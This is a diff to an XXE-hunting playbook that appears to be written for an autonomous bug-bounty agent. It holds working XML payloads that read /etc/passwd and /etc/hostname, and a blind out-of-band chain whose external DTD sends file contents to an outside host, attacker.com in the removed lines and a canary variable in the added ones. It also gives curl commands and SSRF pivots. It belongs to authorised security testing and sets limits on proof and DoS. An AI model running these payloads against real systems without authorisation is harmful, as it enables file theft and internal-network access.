@@ -26,22 +26,22 @@ XXE = file read + SSRF + DoS, all in one. The DoS variant (billion laughs) is us
 If the parser resolves entities and the response echoes XML content, `&xxe;` expands to `/etc/passwd`.
 
 ### Chain 2: Blind XXE → OOB exfiltration
-When the response doesn't echo entities, exfil via DNS/HTTP:
+When the response doesn't echo entities, exfil to the `$AUTOHUNT_OOB` canary via DNS/HTTP:
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE root [
   <!ENTITY % file SYSTEM "file:///etc/passwd">
-  <!ENTITY % dtd SYSTEM "http://attacker.com/exfil.dtd">
+  <!ENTITY % dtd SYSTEM "http://$AUTOHUNT_OOB/exfil.dtd">
   %dtd;
 ]>
 <root>&send;</root>
 ```
-External DTD at `attacker.com/exfil.dtd`:
+External DTD served from `$AUTOHUNT_OOB/exfil.dtd` (host it on the canary if it supports serving files; otherwise a plain callback to `$AUTOHUNT_OOB` still confirms external-entity loading):
 ```xml
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?d=%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://$AUTOHUNT_OOB/?d=%file;'>">
 %all;
 ```
-You'll receive the file contents in your HTTP log (URL-encoded; works for files without newlines or use FTP/Java for binary).
+The file contents arrive in the canary's request log (URL-encoded; works for files without newlines, or use FTP/Java for binary). **If `$AUTOHUNT_OOB` is UNSET, blind OOB exfil isn't observable → fall back to in-band file read (Chain 1); if neither works, it's a LEAD.**
 
 ### Chain 3: XXE via SVG upload
 1. App accepts SVG (profile pic, icon upload, document conversion)
@@ -112,21 +112,21 @@ Indirect (XML hidden inside other formats):
 * Subscription file imports (.ics calendar, MARC bibliographic, etc.)
 
 ### Step 2: Detect XML parser behavior
-For each XML endpoint, send a benign DOCTYPE first to detect parser:
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE root [<!ENTITY test "TESTVALUE">]>
-<root>&test;</root>
+For each XML endpoint, send a benign DOCTYPE first with `curl`/`httpx` to detect parser behavior:
+```bash
+curl -s https://target/api/xml -H 'Content-Type: application/xml' \
+  --data-binary '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test "TESTVALUE">]><root>&test;</root>' \
+  | grep -F TESTVALUE
 ```
-If response contains `TESTVALUE`, internal entities are expanded — XXE is plausible. If it contains `&test;` literal, entities are blocked.
+If the response contains `TESTVALUE`, internal entities are expanded — XXE is plausible (in-band file read likely works). If it contains `&test;` literal, general-entity expansion is blocked — pivot to parameter entities + external DTD for blind (Step 5).
 
 ### Step 3: Test external entity loading
 ```xml
 <?xml version="1.0"?>
-<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://collab.example.com/xxe-test">]>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://$AUTOHUNT_OOB/xxe-test">]>
 <root>&xxe;</root>
 ```
-Watch your collaborator. Hit = external entities load = XXE confirmed. From here, escalate to file read and OOB exfil.
+Submit with `curl`/`httpx` (set the right `Content-Type`, e.g. `application/xml`), then check the `$AUTOHUNT_OOB` canary log. A hit on `/xxe-test` = external entities load = XXE confirmed. From here, escalate to file read and OOB exfil. (If `$AUTOHUNT_OOB` is unset, skip straight to in-band file read in Step 2 / Chain 1.)
 
 ### Step 4: For uploads, package correctly
 SVG: just a text file, paste payload.
@@ -152,12 +152,24 @@ The `<!ENTITY % name "...">` form can chain through external DTDs to exfil. This
 
 **The exploitable cases are usually:** old code, custom parser config, or developer-disabled-the-default-protections.
 
-## Impact Demonstration
+## PROOF (autonomous CLI oracle)
 
-* Show file read of a non-sensitive file first (`/etc/hostname`, `/etc/os-release`) for proof
-* For sensitive files, capture path and show partial content (first line, byte count) — don't extract /etc/shadow in full
-* For SSRF chain via XXE, show internal-only response
-* Document the parser if identifiable (User-Agent on outbound, error messages, library fingerprints in stack traces)
+Confirm via the firewalled Bash CLI (`curl`/`httpx`) plus the `$AUTOHUNT_OOB` canary. A finding needs one of:
+
+* **In-band file read (strongest, no OOB needed):** read a benign marker file and grep for its known content in the response:
+  ```bash
+  curl -s https://target/api/xml -H 'Content-Type: application/xml' \
+    --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><r>&xxe;</r>' \
+    | grep -i .
+  # /etc/hostname or /etc/os-release content echoed back = confirmed file read
+  ```
+  Use `/etc/hostname` or `/etc/os-release` for proof. For sensitive files, capture the path and show partial content (first line, byte count) — don't extract `/etc/shadow` in full.
+* **Blind OOB exfil (when response is echo-less):** if `$AUTOHUNT_OOB` is set, use the parameter-entity + external-DTD chain (Chain 2) to send file contents to the canary, then read them out of the canary's request log. A canary hit carrying file bytes = confirmed blind XXE.
+* **SSRF chain via XXE:** point an entity at an internal target (Chain 7) and show the internal-only response in-band, or force a canary callback.
+* For binary/multiline files use `php://filter/convert.base64-encode` (Chain 8) or FTP/Java OOB exfil to get a single safe line.
+* Document the parser if identifiable (User-Agent seen on the canary's outbound hit, error messages, library fingerprints in stack traces).
+
+**LEAD vs finding:** if you cannot read a file in-band *and* `$AUTOHUNT_OOB` is UNSET (so no OOB exfil is observable), the XXE is unproven → record a LEAD with the exact payload, not a confirmed finding. Submit any upload-packaged payloads (SVG/DOCX) with `curl -F`/`--data-binary` and check the response or canary the same way.
 
 ## Key Considerations
 
@@ -168,3 +180,5 @@ The `<!ENTITY % name "...">` form can chain through external DTDs to exfil. This
 * Billion laughs DoS is interesting but virtually never paid — mention impact, don't actually run it
 * If the parser blocks `SYSTEM`, try `PUBLIC "id" "URL"`
 * Read DTD files to find the parser's library by error fingerprints
+* `$AUTOHUNT_OOB` may be unset — never gate a *finding* on a callback you can't observe; prefer in-band file read, else downgrade to LEAD
+* If fuzzing multiple XML entry points, carry the rate caps from TARGET.md on any scan tooling
